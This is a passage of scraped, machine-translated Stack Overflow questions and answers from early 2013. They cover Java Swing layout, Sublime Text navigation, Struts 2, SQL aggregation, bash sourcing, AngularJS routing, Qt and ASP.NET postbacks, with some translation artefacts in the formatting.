private JTextField paymentMade = new JTextField(5);

//Bottom
private JPanel itemPanel = new JPanel(new BorderLayout());
private JPanel testPanel = new JPanel(new GridLayout(2 , 4 , 4 , 20));
private JLabel emptyLabel = new JLabel("");
private JLabel emptyLabel2 = new JLabel("");
private JLabel barcode = new JLabel("Enter Barcode :");
private JTextField barcodeScanner = new JTextField(5);
private JLabel quantity = new JLabel("Quantity :");
private JTextField itemQuantity = new JTextField(5);
private JButton addItem = new JButton("Add");
private JButton deleteItem = new JButton("Delete");

    //                                           //
   //                                           //
  //    Beginning of Constructor and Method    //
 //                                           //
//                                           //

SalesScreen(JTabbedPane tabp , JFrame f) //tabp is Jtabbedpanel , f is the Jframe
{
    mainPanel.setLayout(new BorderLayout());
    memberID.setText("          Member ID :");
    memberIDField.setText("");
    memberName.setText("Member Name :");
    memberNameField.setText("");
    memberNameField.setEditable(false);
    memberPanel.add(memberID);
    memberPanel.add(memberIDField);
    memberPanel.add(memberName);
    memberPanel.add(memberNameField);
    memberPanel.add(memberButton);
    //
    model.setColumnIdentifiers(columnNames);
    itemList = new JTable(model);
    scroll = new JScrollPane(itemList); 
    //tablePanel.add(scroll);
    //
    total.setLabelFor(totalPrice);
    totalPrice.setEditable(false);
    discountRate.setEditable(false);
    overallPrice.setEditable(false);
    process.setPreferredSize(new Dimension(100, 100));
    discount.setLabelFor(discountRate);
    overall.setLabelFor(overallPrice);
    payment.setLabelFor(paymentMade);
    infoGridPanel.add(total);
    infoGridPanel.add(totalPrice);
    infoGridPanel.add(discount);
    infoGridPanel.add(discountRate);
    infoGridPanel.add(overall);
    infoGridPanel.add(overallPrice);
    infoGridPanel.add(payment);
    infoGridPanel.add(paymentMade);
    infoFlowPanel.add(infoGridPanel);
    infoFlowPanel.add(process);
    infoPanel.add(infoFlowPanel , "South");
    //

    testPanel.setMaximumSize( new Dimension(  100, 100) );
    testPanel.add(barcode);
    testPanel.add(barcodeScanner);
    testPanel.add(addItem);
    testPanel.add(deleteItem);
    testPanel.add(quantity);
    testPanel.add(itemQuantity);
    testPanel.add(emptyLabel);
    testPanel.add(emptyLabel2);
    itemPanel.add(testPanel , "West");
    //
    mainPanel.add(memberPanel , "North");
    mainPanel.add(scroll , "Center");
    mainPanel.add(infoPanel , "East");
    mainPanel.add(itemPanel , "South");
    tabp.add("Sales" , mainPanel); 
    f.add(tabp);
}` 
```

 **}

**问题：**

1.)如您所见，中间有一个Jtable，右下面板有一个JPanel，底部也有一个。我想要做的是通过将底部面板稍微移到上方来消除 Jtable 末尾的可用空间。我不断尝试，但无济于事。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-01T14:15:30.130

如果您希望将底部面板稍微向上移动，您可以简单地减少`GridLayout`for中的垂直间隙`testPanel`。代替

```
private JPanel testPanel = new JPanel(new GridLayout(2 , 4 , 4 , 20)); 
```

和

```
private JPanel testPanel = new JPanel(new GridLayout(2, 4, 4, 5)); 
```

也更好地覆盖`getPreferredSize()`组件而不是调用`setPreferredSize`. 这确保了首选大小不能由其他组件设置。

调用`JFrame.pack`将通过根据首选大小排列所有组件来调整窗口大小来完成任务。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-01T17:04:18.243

```
import javax.swing.*;
import java.awt.*;
import javax.swing.table.DefaultTableModel;
class SalesScreen{

private JPanel mainPanel = new JPanel();

//Top Member Panel
private JPanel memberPanel = new JPanel(new FlowLayout(FlowLayout.LEFT));
private JLabel memberID =  new JLabel();
private JTextField memberIDField = new JTextField(10);
private JLabel memberName = new JLabel();
private JTextField memberNameField = new JTextField(30);
private JButton memberButton = new JButton("OK");

//Center Table Panel
private JPanel tablePanel = new JPanel(new FlowLayout(FlowLayout.CENTER));
private JTable itemList;
String [] columnNames = {"Barcode" , "Name" , "Price (RM)" , "Quantity"};
int numRows = 50;
DefaultTableModel model = new DefaultTableModel(numRows , columnNames.length);
JScrollPane scroll;

//Bottom Right 
private JPanel infoPanel = new JPanel(new BorderLayout());
private JPanel infoGridPanel = new JPanel( new GridLayout(4,2));
private JPanel infoFlowPanel = new JPanel(new FlowLayout());
private JLabel total = new JLabel("          Total (RM) :");
private JLabel discount = new JLabel("          Discount Rate (%) : ");
private JLabel overall = new JLabel("          Overall (RM) :");
private JLabel payment = new JLabel("          Payment (RM) :");
private JButton process = new JButton("PROCESS");
private JTextField totalPrice = new JTextField(5);
private JTextField discountRate = new JTextField(5);
private JTextField overallPrice = new JTextField(5);
private JTextField paymentMade = new JTextField(5);

//Bottom
private JPanel itemPanel = new JPanel(new BorderLayout());
private JPanel testPanel = new JPanel(new GridLayout(2 , 4 , 4 , 20));
private JLabel emptyLabel = new JLabel("");
private JLabel emptyLabel2 = new JLabel("");
private JLabel barcode = new JLabel("Enter Barcode :");
private JTextField barcodeScanner = new JTextField(5);
private JLabel quantity = new JLabel("Quantity :");
private JTextField itemQuantity = new JTextField(5);
private JButton addItem = new JButton("Add");
private JButton deleteItem = new JButton("Delete");

    //                                           //
   //                                           //
  //    Beginning of Constructor and Method    //
 //                                           //
//                                           //

SalesScreen(JTabbedPane tabp , JFrame f) //tabp is Jtabbedpanel , f is the Jframe
{
    mainPanel.setLayout(new BorderLayout());
    memberID.setText("          Member ID :");
    memberIDField.setText("");
    memberName.setText("Member Name :");
    memberNameField.setText("");
    memberNameField.setEditable(false);
    memberPanel.add(memberID);
    memberPanel.add(memberIDField);
    memberPanel.add(memberName);
    memberPanel.add(memberNameField);
    memberPanel.add(memberButton);
    //
    model.setColumnIdentifiers(columnNames);
    itemList = new JTable(model);
    scroll = new JScrollPane(itemList); 
    //tablePanel.add(scroll);
    //
    total.setLabelFor(totalPrice);
    totalPrice.setEditable(false);
    discountRate.setEditable(false);
    overallPrice.setEditable(false);
    process.setPreferredSize(new Dimension(100, 100));
    discount.setLabelFor(discountRate);
    overall.setLabelFor(overallPrice);
    payment.setLabelFor(paymentMade);
    infoGridPanel.add(total);
    infoGridPanel.add(totalPrice);
    infoGridPanel.add(discount);
    infoGridPanel.add(discountRate);
    infoGridPanel.add(overall);
    infoGridPanel.add(overallPrice);
    infoGridPanel.add(payment);
    infoGridPanel.add(paymentMade);
    infoFlowPanel.add(infoGridPanel);
    infoFlowPanel.add(process);
    infoPanel.add(infoFlowPanel , "South");
    //

    testPanel.setMaximumSize( new Dimension(  100, 100) );
    testPanel.add(barcode);
    testPanel.add(barcodeScanner);
    testPanel.add(addItem);
    testPanel.add(deleteItem);
    testPanel.add(quantity);
    testPanel.add(itemQuantity);
    testPanel.add(emptyLabel);
    testPanel.add(emptyLabel2);
    itemPanel.add(testPanel , "West");
    itemPanel.add(infoPanel , "East");
    //
    mainPanel.add(memberPanel , "North");
    mainPanel.add(scroll , "Center");
  //  mainPanel.add(infoPanel , "East");
    mainPanel.add(itemPanel , "South");
    tabp.add("Sales" , mainPanel); 
    f.add(tabp);
    f.setVisible(true);
}
    public static void main(String[] args){
SalesScreen s=new SalesScreen(new JTabbedPane(),new JFrame("test"));
}
} 
```

试试这个代码..**

# sublimetext2 - 是否有命令可以在 sublime 文本中上下移动侧边栏文件列表？

> ID：14111091
> 
> 赞同：15
> 
> 时间：2013-01-01T13:59:13.320
> 
> 标签：sublimetext2

我在崇高的文本中经常使用侧边栏，我想要一些快速的方式来上下移动列表（最好使用键绑定，但如果有一些命令，那么我确定我可以绑定它）。

例如，如果我在一个文件夹中有 10 个文件，那么我可以单击一个并查看它，但是我必须拿起鼠标才能查看下一个或上一个文件。我希望能够移动到列表中的下一个或上一个文件。

我知道我可以使用 ctrl-p 来搜索文件，但我希望有一个键盘快捷键来简单地移动到下一个文件。有这样的吗？

* * *

## 回答 #1

> 赞同：37
> 
> 时间：2013-01-01T14:29:53.923

如果您将侧边栏作为焦点，则`Control+0`可以使用箭头键在文件中上下移动。`Right Arrow`将打开一个文件夹`Left Arrow`并将其关闭。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-01T14:18:14.643

alt-1 ，替代数字？在标签之间切换？首先打开所有 10 个文件：P

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2021-07-10T16:32:44.590

您可以专注于您正在编辑的文件和类型`Ctrl + 0`，这会引导您找到它在树中的位置。如果树被折叠，则展开树。从那里您现在可以使用箭头（或 VIM 等效方向）移动。

然后返回，编辑任何树选择的文件，你可以使用`next_view`默认的命令`super+shift+]`

在[*.sublime-keymap*](https://www.sublimetext.com/docs/key_bindings.html)我们可以找到默认值。 `{ "keys": ["super+shift+]"], "command": "next_view" }`

# java - Struts 2 - 当第二个动作与表单一起工作时，动作之间的传递参数会丢失

> ID：14111092
> 
> 赞同：1
> 
> 时间：2013-01-01T13:59:21.750
> 
> 标签：java, struts2, parameter-passing, chain, model-driven

我有两个动作类，它们通过`ModelDriven`接口使用相同的模型。 **每个动作类都使用 form**。我需要在两个动作中将值存储到同一个模型。

从第一个动作类（验证后），我通过模型驱动模型进入第二类：

```
@Result(name = "success", location = "action2", type = "chain") 
```

在第二个动作类中，我显示了在第一个动作中已存储到模型中的值。

这很好用，但是当我在第二个操作中执行表单提交时，第一个操作的存储值会丢失。

**因此，来自第一个动作的数据仅存储用于第一次调用第二个动作。**

有什么解决方案可以实现这一目标吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-01T17:41:35.880

[将您的数据放入会话中，或使用带有这里](http://struts.apache.org/docs/parameters-in-configuration-results.html)和[那里](http://struts.apache.org/docs/convention-plugin.html#ConventionPlugin-Resultannotation)描述的结果的参数。

> 可以使用 params 属性将参数传递给结果。该属性的值是一个包含偶数个元素的字符串数组，形式为 {"key0", "value0, "key1", "value1" ... "keyN", "valueN"}。例如：
> 
> ```
>  @Action(value="/different/url",
>     results={@Result(name="success", type="httpheader", params={"status", "500", "errorMessage", "Internal Error"})}
>   ) 
> ```

# ssis - 脚本组件生成多个输出文件

> ID：14111093
> 
> 赞同：0
> 
> 时间：2013-01-01T13:59:34.160
> 
> 标签：ssis

我分别在 INT 和 Dev 环境中部署了一个 SSIS 包。在该包中，我有一个数据流任务，它分别使用一个 OLEDB 源和脚本组件（用作目标）。

OLEDB 源组件使用一个存储过程来生成数据。

现在的问题是：

如果我在 INT 中执行包，那么我会在共享路径中获得多个输出文件，如果我在 Dev 中执行相同的包，那么我只会获得一个输出文件。

我已经比较了 INT 和 Dev 中存储过程的两个版本，它们是相同的！！

不确定到底是什么问题。请指教

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-01T14:47:42.217

从逻辑上讲，如果相同的代码在两个不同的环境中运行并产生不同的结果，那么其他东西肯定是不同的。在你的情况下，我敢打赌这是一个潜在的数据问题。您基于 DEV 中的数据做出了在 INT 中无效的假设。

通过为您的目标选择一个脚本组件，您可以完全控制如何生成输出，因此要么更新您的代码以解决 INT 中导致多个文件的场景，要么清理 INT 中的数据以免导致这种情况在 .NET 代码中。

如果您需要更详细的答案，我们将需要更详细的问题。请更新您的问题并添加您的

*   .net 代码
*   存储过程签名（col1 int、col2 varchar(30) 等）
*   可能是一些样本数据

# java - 线程“主”java.lang.ArrayIndexOutOfBoundsException 中的异常：坐标超出范围

> ID：14111102
> 
> 赞同：-1
> 
> 时间：2013-01-01T14:01:07.290
> 
> 标签：java

```
public static int[] getPixelData(BufferedImage img, int x, int y)

{

int argb = img.getRGB(x, y);

int rgb[] = new int[] 

{

((argb >> 16) & 0xfe), //red

(argb >>  8) & 0xfe, //green

(argb      ) & 0xfe  //blue

};

System.out.println("rgb: " + Integer.toBinaryString(rgb[0]) + " " + Integer.toBinaryString(rgb[1]) + " " +Integer.toBinaryString(rgb[2]));

return rgb;

} 
```

o/p

> rgb: 10111000 11010010 11110110 rgb: 10111010 11011010 11111100 rgb: 10101110 11010100 11110010 rgb: 10100010 11010000 11100110 rgb: 10100000 11010100 11100000 rgb: 10011110 11010110 11010100 rgb: 10011110 11011000 11001110 rgb: 10011110 11011000 11001110

这是例外

> 线程“主”java.lang.ArrayIndexOutOfBoundsException 中的异常：坐标超出范围！在 sun.awt.image.ByteInterleavedRaster.getDataElements(Unknown Source) at java.awt.image.BufferedImage.getRGB(Unknown Source) at get_pixel_value.getPixelData(get_pixel_value.java:52) at get_pixel_value.get_pixel_info(get_pixel_value.java:28)在 Hash_Function2.main(Hash_Function2.java:26)

我怎么能删除这个异常

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-01T14:08:08.520

k 的值应该小于 3 而不是 rgb.length 因为你定义

```
int[][] pixelData = new int[img.getHeight() * img.getWidth()]  [3]; 
```

或者如果 rgb.length 正确，则需要相应地更改数组大小。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-01T14:25:32.940

尝试这个

```
img = ImageIO .read(new File(IMG));
int[][] pixelData = new int[img.getHeight() * img.getWidth()][];
for(int i = 0; i < img.getHeight(); i++) {
    for(int j = 0; j < img.getWidth(); j++) {
        pixelData[i*img.getWidth()+j] = getPixelData(img, i, j);

    }
}

...

public static int[] getPixelData(BufferedImage img, int x, int y) {
    int argb = img.getRGB(x, y);
    int rgb[] = new int[] {
        ((argb >> 16) & 0xff), //red 
        (argb >> 8) & 0xff, //green
        (argb ) & 0xff //blue
    }
    return rgb;
} 
```

但您也可以直接从 BufferedImage 获取 rgb 数组。还有第二种 getRGB 方法。 [http://docs.oracle.com/javase/7/docs/api/java/awt/image/BufferedImage.html](http://docs.oracle.com/javase/7/docs/api/java/awt/image/BufferedImage.html)

# bash - 源命令后刷新 bash 提示符

> ID：14111106
> 
> 赞同：1
> 
> 时间：2013-01-01T14:01:16.210
> 
> 标签：bash, terminal

我将 shell 脚本用于某些特定目的，它的功能是 relad `.bash_profile`：

```
function refresh {
    source "$HOME/.bash_profile"
} 
```

同样`.bash_profile`有这样的说法：

```
if [ -f "$HOME/.bash_prompt" ]; then
    source "$HOME/.bash_prompt"
fi 
```

哪个也应该重新加载`.bash_prompt`；确实如此，该提示文件包含应该更改提示显示的值（颜色、文本位置等），但这些值不会改变。它们仅在新的终端窗口或我`source "$HOME/.bash_prompt"`在终端窗口内显式调用时才会更改。

我在这里做错了吗？

这是我的`.bash_prompt`来源：

```
# Colors
# Bunch of color codes

function print_before_the_prompt {

    # create a $fill of all screen width
    let fillsize=${COLUMNS}
    fill=""
    while [ "$fillsize" -gt "0" ]
    do
    fill="-${fill}" # fill with underscores to work on
    let fillsize=${fillsize}-1
    done

    printf "$txtrst$bakwht%s" "$fill"
    printf "\n$bldblk%s%s\n" "${PWD/$HOME/~}" "$(__git_ps1 "$txtrst [$txtblu%s$txtrst]")"

}

# Load Git completion and prompt
if [ -f "/usr/local/opt/git/etc/bash_completion.d/git-completion.bash" ]; then
    source "/usr/local/opt/git/etc/bash_completion.d/git-completion.bash"
fi
if [ -f "/usr/local/opt/git/etc/bash_completion.d/git-prompt.sh" ]; then
    source "/usr/local/opt/git/etc/bash_completion.d/git-prompt.sh"
fi

GIT_PS1_SHOWDIRTYSTATE=true
PROMPT_COMMAND=print_before_the_prompt
PS1="\[$txtred\]⦿\[$txtrst\] " 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-01T14:28:12.383

您还需要获取托管`refresh`函数的脚本，而不是执行它。如果你不这样做，环境只会在脚本执行期间改变。

**说明**：当您执行脚本时，它会继承其父级的当前环境（在本例中：您的 shell），并赋予它自己的环境。脚本中的所有环境更改仅适用于脚本本身及其子项。

但是，当您获取脚本时，所有更改和命令都会直接影响父级的环境。

通常，建议将要作为来源的脚本与通用脚本分开。例如，对于`dev.sh`需要一些特殊变量的特定开发项目，您可以拥有一个包含特殊环境变量的文件。

如果您想快速`.bash_profile`获取当前 shell 的来源，可以设置别名。通过执行脚本来做到这一点是不可能的。

# sql - SQL 获取总值

> ID：14111107
> 
> 赞同：1
> 
> 时间：2013-01-01T14:01:29.067
> 
> 标签：sql, sql-server, tsql, sql-server-2005

我使用的是 SQL Server 2005，我想获取 1 张发票的总值

电流输出：

```
Invoice     price    
-------------------
1234       2000    
1234       2500     
9012        3000       
3456        1000 
```

但是我的选择字段（这是价格）已经很长了，我不知道如何在上面加上总和，

```
 RIGHT('000000000000'+ convert(varchar,cast(A.IVC_ForeignGrossAmt as decimal(9,2))),13) as IVC_ForeignGross, 
```

预期的输出应该是：

```
Invoice     price   
-------------------
1234       4500        
1234       4500       
9012        3000       
3456        1000 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-01T14:04:25.320

使用相关子查询，如下所示：

```
SELECT
  Invoice,
  (SELECT SUM(t2.price)
   FROM table1 t2
   WHERE t1.invoice = t2.invoice) price           
FROM Table1 t1; 
```

## [SQL 小提琴演示](http://www.sqlfiddle.com/#!3/c81ac/1)

这会给你：

```
| INVOICE | PRICE |
-------------------
|    1234 |  4500 |
|    1234 |  4500 |
|    9012 |  3000 |
|    3456 |  1000 | 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-01T14:07:17.550

您可以使用`SUM-OVER`with `PARTITION BY Invoice`（类似于 a `Group By`）：

```
SELECT
   Invoice, SUM(price) OVER (PARTITION BY Invoice) AS price   
FROM 
   dbo.Table 
```

（但是，不确定`RIGHT('000000000000...`您的问题的一部分）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-01T14:04:04.297

你的意思是输出应该是，

```
Invoice     price   
-------------------
1234       4500             
9012        3000       
3456        1000 
```

你可以试试

```
SELECT INVOICE.ID, SUM(PRICE) FROM INVOICE
GROUP BY INVOICE.ID 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-01-01T14:06:22.300

```
SELECT Invoice, SUM(price) FROM table1 GROUP BY Invoice; 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-01-01T14:07:44.940

您只需要`SUM`基于`GROUP BY`发票上的价格，并根据需要格式化价格。

```
SELECT A.Invoice, 
RIGHT('000000000000'+ convert(varchar,cast(SUM(A.IVC_ForeignGrossAmt)
as decimal(9,2))),13) as IVC_ForeignGross 
FROM yourTable A
GROUP BY Invoice; 
```

# javascript - 向下移动溢出列表框，因为每个复选框都被循环自动取消选中

> ID：14111113
> 
> 赞同：0
> 
> 时间：2013-01-01T14:02:37.067
> 
> 标签：javascript, css, loops, listbox

好的，所以标题听起来很复杂，但我想要做的想法实际上很简单。

我有一个由循环自动填充的列表框。像这样的东西。。

```
TICKBOX | VALUE |
TICKBOX | VALUE |
TICKBOX | VALUE | 
```

它是可滚动的，但通常包含许多项目，有时甚至是数百个。

我有另一个循环在每个复选框通过它们时取消选中它们，大约每秒 1 个左右。

就目前而言，复选框在处理每个复选框时都未选中，但我想自动滚动该框，以便底部项目始终是下一个要处理的项目，或者下一个带有仍然勾选框的项目。

有人有想法么？我已经尝试过`scrollTop`，但我对 javascript/CSS 不是很好。

编辑：我尝试了一些东西，但甚至没有接近。我将添加一小段代码，但它来自 20'000 行脚本，因此可能没有多大意义。随意摇晃它和东西。

```
 m += '<DIV style="max-height:220px; overflow-y:auto;">';
    m += '<TABLE align=center cellpadding=0 cellspacing=0></td><TD width=15><input type=checkbox id=pbsrcScout_All></td><TD>COLUMN 2</td></tr>';
    var coordlist = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12", "13"] // just made this up so it makes some small sense.
    for (i = 0; i < coordlist.length; i++) {
    var addOn = coordlist[i];
    m += '<TABLE align=center cellpadding=0 cellspacing=0>'
    m += '<TR><TD><INPUT type=checkbox id="pbsrcScoutCheck_' + coordlist[i] + '"></td><TD>' + coordlist[i] + '</td><TD><DIV id=statusMessage_' + addOn + '></div></td></tr>';
    }
    m += '</table>'
    m += '</table></div>'; 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-01T15:51:26.673

希望我能正确理解你的问题。如果您对使用 jQuery 感到满意，您可以尝试以下方法。为此，您需要为包含 div 的 main 提供一个唯一 ID。我在这个例子中使用了“父母”。

你说你有一个循环每 1 秒检查一次每个复选框，所以我使用 setInterval 来模拟循环。

[工作示例](http://jsfiddle.net/qvfrb/1/)

```
var checkboxes = $('[id^=pbsrcScoutCheck_]'), // find all checkboxes
    checkboxIndex = 0, // so we know what box needs to be unchecked next
    parent = $("#parent"), // the main parent div container. 
    interval;

// emulate you're loop that checks each box
interval = setInterval(function() {
    var checkbox = $(checkboxes[checkboxIndex]).attr('checked', false);
    if (checkbox.position().top + (checkbox.height() * 3) > parent.height()) {
        parent.stop(true, true).animate({
            scrollTop: "+=" + (checkbox.height() * 3)
        }, 500);
    }

    checkboxIndex++;
    if (checkboxIndex > checkboxes.length) {
        clearInterval(interval);
    }
}, 1000); 
```

# ios - 从地标重新格式化字符串结果

> ID：14111116
> 
> 赞同：2
> 
> 时间：2013-01-01T14:03:22.557
> 
> 标签：ios, nsstring, mkmapview, mapkit, mkplacemark

`placemark.subThoroughfare` 当我搜索一个位置时，有时我会从如何将该符号重新格式化为正常的“-”中获取此字符串？

![在此处输入图像描述](../Images/257c3f3b436ccfecc10be7b6afe0fdd4.png)

非常感谢您的回答

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-01T16:24:46.700

假设问题是 En Dash 或 Em Dash 字符，这里是一个示例解决方案。如果您的角色不同，请查看 UTF8 数据并改用它。

```
NSString *enDashCharacter = [NSString stringWithUTF8String:"\xe2\x80\x93"];
NSString *emDashCharacter = [NSString stringWithUTF8String:"\xe2\x80\x94"];
NSLog(@"enDashCharacter: %@", enDashCharacter);
NSLog(@"emDashCharacter: %@", emDashCharacter);

NSString *textString = [NSString stringWithFormat:@"1-2 3%@4 5%@6", enDashCharacter,emDashCharacter];
NSData *textData = [textString dataUsingEncoding:NSUTF8StringEncoding];
NSLog(@"textString: '%@'", textString);
NSLog(@"textData: %@", textData);

NSString *newString = textString;
newString = [newString stringByReplacingOccurrencesOfString:enDashCharacter withString:@"-"];
newString = [newString stringByReplacingOccurrencesOfString:emDashCharacter withString:@"-"];
NSLog(@"newString:  '%@'", newString);

NSData *newStringData = [newString dataUsingEncoding:NSUTF8StringEncoding];
NSLog(@"newStringData: %@", newStringData); 
```

NSLog 输出：
enDashCharacter：-<br> emDashCharacter：-<br> textString：'1 - 2 3 - 4 5 - 6'
textData：<2031202d 20322033 20e28093 20342035 20e28094 203620> newString
：'1 - 2 3 - 4 5 - 6 '
新字符串数据：<2031202d 20322033 202d2034 2035202d 203620>

# qt5 - 使用 QNetworkAccessManager 从 ftp 服务器获取文件列表的 Qt 代码

> ID：14111120
> 
> 赞同：11
> 
> 时间：2013-01-01T14:03:36.817
> 
> 标签：qt5

我正在 Qt 中编写一个简单的FTP**客户***端*。我正在使用**Qt 5.0**。

 ****我已经编写了一个代码来使用**Qt 5.0**中已弃用的`QNetworkAccessManager`as下载和上传文件。`QFtp`

 **我想编写一个代码来获取*FTP*上所有文件的列表。我得到了使用`QFtp`但不使用的解决方案`QNetworkAccessManager`。建议我怎么做。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-01-01T20:31:31.877

`QFtp`如果您需要列出远程目录的内容，您仍然需要使用，因为`QNetworkAccessManager`尚未处理该部分。

`QFtp`已作为独立模块移动，您可以从 gitorious 存储库下载或签出：[https](https://qt.gitorious.org/qt/qtftp) ://qt.gitorious.org/qt/qtftp （单击“源树”然后“下载主...”下载） .******

# controller - AngularJS - 按 ID 获取数据

> ID：14111121
> 
> 赞同：6
> 
> 时间：2013-01-01T14:03:49.687
> 
> 标签：controller, get, routes, angularjs

我遇到了以下情况：
我有一些自定义标记和静态（非谷歌）地图。我使用以下代码显示（和过滤）标记：

```
<div ng-controller="DealerDetailsListCtrl">
    <a ng-click="showdetails=!showdetails" href="#/dealer/{{marker.id}}" class="marker" style="left:{{marker.left}};top:{{marker.top}}" ng-repeat="marker in dealer|zipFilter:zipCodeLookup:countryLookup"></a>
</div> 
```

我将其路由到成功显示 ID 的“dealer-details.html”：

```
 <div class="alldealermodal" ng-controller="DealerDetailsCtrl">      
    <div ng-view></div>
  </div> 
```

使用此控制器/路由：

```
app.config(['$routeProvider', function($routeProvider) {
  $routeProvider.
      when('/dealer/:id', {templateUrl: 'files/tpl/dealer-details.html', controller: DealerDetailsCtrl}).
      otherwise({redirectTo: '/'});
}]); 
```

和

```
function DealerDetailsCtrl($scope, $routeParams) {
  $scope.id = $routeParams.id;
} 
```

由于我对 angularJS 很陌生，我想知道，如何通过 ID 获取所有数据。

我的 json 文件如下所示：

```
[
{
    "id": "2",

    "name": "Laden Dortmund",
    "strasse": "Unionstr.",
    "hausnr": 1,
    "plz": "45525",
    "stadt": "Dortmund",
    "land": "DE",
    "url": "http://www.google.de",
    "tel": "0234-234568",
    "email": "lade@indortmund.de",
    "left": "200px",
    "top": "300px",
    "lowRange":60000,
    "highRange":70000
},
{
    "id": "1",
    "name": "Laden Unna",
    "strasse": "Berlinerstr.",
    "hausnr": 134,
    "plz": "78654",
    "stadt": "Unna",
    "land": "AT",
    "url": "http://www.bing.de",
    "tel": "0234-11223344",
    "email": "lade@inunna.de",
    "left": "250px",
    "top": "500px",
    "lowRange":40000,
    "highRange":50000
}
] 
```

依此类推....我想从所选ID中获取所有数据。我怎样才能做到这一点？有人能给我一个提示吗？

我使用这个控制器从 json 中获取所有数据：

```
function DealerListCtrl($scope, $http) {
  $scope.dealer = [];
  $http.get('files/js/dealer.json').success(function(data) {
    $scope.dealerall = data;
  });
  $scope.orderProp = 'id';
} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-01T15:00:20.200

首先，您不需要设置`ng-controller="DealerDetailsCtrl"`in `dealer-details.html`，因为`ng-view`会处理好。

其次，您应该提供一项[服务](http://docs.angularjs.org/guide/dev_guide.services.creating_services)来检索您的数据：

```
var app = angular.module('myApp', []);

app.factory('dealerService', function($http) {
   return {
      getDealerList function() {
         var dealers = {
            list : []
         };
         // TODO add possible caching via $cacheFactory
         $http.get('files/js/dealer.json').success(function(data) {
            dealers.list = data;
         });
         return dealers;
      },

      // other functions
   };

}); 
```

在您的控制器中，您需要访问您的经销商，只需`DealerService`像其他服务一样注入。要获取特定条目，只需迭代。

另一种可能性是使用[$routeProvider](http://docs.angularjs.org/api/ng.%24routeProvider)`resolve`上的属性将经销商数据发送到 DetailController。

# android - Android：不同视图的布局内边距、边距、间距属性及其默认值

> ID：14111123
> 
> 赞同：1
> 
> 时间：2013-01-01T14:04:00.983
> 
> 标签：android, layout, margin, padding, spacing

是否有任何资源在一个位置具有不同视图的所有默认边距、填充、间距等？像布局备忘单或其他东西。在进行布局以了解每个视图的非零间距属性的名称时，这将非常方便，因此您无需搜索它们。如果不能，你们中的一位大师可以在这里创建一个吗？

# qtextbrowser - 如何在 Qtextbrowser 中使用系统字体

> ID：14111126
> 
> 赞同：0
> 
> 时间：2013-01-01T14:04:09.267
> 
> 标签：qtextbrowser, system-font

我正在编写一个 Qt 应用程序，我想在`QTextBrowser`. 有什么方法可以查询默认系统字体是什么，并设置相同的`QTextBrowser`？

以下片段显示了我现在拥有的内容：

```
QString line;
    QFont myfont ("Monospace");
    myfont.setPixelSize(12);
    myfont.setBold(true);
    line.append("Hello!\n\n");
    this->MessageBrowser->setTextColor(Qt::blue);
    this->MessageBrowser->append(line);
    this->MessageBrowser->setFont(myfont);
    line.append("Hello Again!\n\n");
    this->MessageBrowser->setTextColor(Qt::red);
    this->MessageBrowser->append(line);
    this->MessageBrowser->setFont(myfont); 
```

将不胜感激任何帮助。

非常感谢。

德文德拉

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-01T15:06:44.373

找到了答案。使用`setStyleHint`函数，它将尝试在目标机器上找到与请求字体最接近的匹配。

```
QString line;

    QFont myfont ("Monospace");
    myfont.setStyleHint(QFont::Monospace);
    myfont.setPixelSize(12);
    myfont.setBold(true);
    line.append("Hello!\n\n");
    this->MessageBrowser->setTextColor(Qt::blue);
    this->MessageBrowser->append(line);
    this->MessageBrowser->setFont(myfont);
    line.append("Hello Again!\n\n");
    this->MessageBrowser->setTextColor(Qt::red);
    this->MessageBrowser->append(line);
    this->MessageBrowser->setFont(myfont);

    this->MessageBrowser->moveCursor(QTextCursor::End); 
```

虽然我仍然不确定这是否是完美的解决方案。

德文德拉

# c# - pageslide 插件不会触发回发

> ID：14111131
> 
> 赞同：1
> 
> 时间：2013-01-01T14:04:24.030
> 
> 标签：c#, jquery, postback

我正在使用[PageSlide](http://srobbin.com/jquery-plugins/pageslide)插件。我向 div#modal、ASP 标签和一个按钮添加了一个表单。但是，该按钮不会在单击时触发回发事件。

HTML：

```
<html xmlns="http://www.w3.org/1999/xhtml">

<head runat="server">
<title></title>
<script src="js/jquery-1.8.3.min.js" type="text/javascript"></script>
<link href="css/jquery.pageslide.css" rel="stylesheet" type="text/css" />
</head>

<body>
<form id="form1" runat="server">
 <script src="js/jquery.pageslide.min.js" type="text/javascript"></script>    
 <a href="#modal" class="second">Show</a>
 <div id="modal" style="display: none">        
  <asp:Label ID="Label1" runat="server" Text="Label"></asp:Label><br />
  <asp:Button ID="Button1" runat="server" Text="Submit" OnClick="Button1_Click"/>
 </div>
 <p><a href="javascript:$.pageslide.close()">Close</a></p>
 <script>
    $(".second").pageslide({ direction: "left", modal: true });
 </script>
</form> 
```

代码隐藏：

```
protected void Button1_Click(object sender, EventArgs e)
{
    Label1.Text = "Its Working";
} 
```

谁能告诉我怎么了？提前致谢。:)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-01T15:17:42.927

在我看来，这种行为的原因是因为插件克隆了模态 div 并使用克隆的内容来显示模态弹出窗口。因此，`Button1`不再放置在表单中，也不会导致点击回发。尝试设置`UseSubmitBehavior="false"`按钮的属性。这种方式回发应该通过javascript而不是defaulr提交按钮的行为来触发

# android - 当在 GCMIntentService 类中调用 OnUnregistered() 方法时

> ID：14111134
> 
> 赞同：2
> 
